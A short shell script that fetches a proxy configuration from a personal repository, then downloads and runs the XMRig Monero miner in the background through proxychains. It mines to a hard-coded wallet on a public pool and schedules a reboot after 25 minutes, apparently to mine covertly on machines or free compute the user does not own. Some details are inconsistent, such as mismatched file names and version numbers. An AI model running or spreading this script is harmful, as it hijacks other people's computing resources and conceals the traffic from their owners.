#!/bin/sh
sudo -i
sudo apt-get update
sudo apt-get install -y proxychains tar
wget https://raw.githubusercontent.com/cuongptp1/123/master/sock/40/proxychains.conf
mv proxychains1.conf /etc/proxychains.conf
wget https://github.com/xmrig/xmrig/releases/download/v6.5.1/xmrig-6.5.3-linux-x64.tar.gz
tar --extract --file xmrig-6.5.3-linux-x64.tar.gz
cd xmrig-6.5.3
export PROXY_DNS_SERVER=1.1.1.1
proxychains ./xmrig --no-color --donate-level 1 --cpu-priority 2 -o us-west.minexmr.com:6666 -u 483NjkJRvjeNhTcd9Gqk3d7FmrsR5NTHm8wu2rvKpWyXQdUK3qAeXhiLA6kQZUk7KnMarQwmbRUkxSDPrBK3z2Ra1hoEEKL.d10 -p x -a cn/r -t 2 -k --tls -B
sudo shutdown -r +25
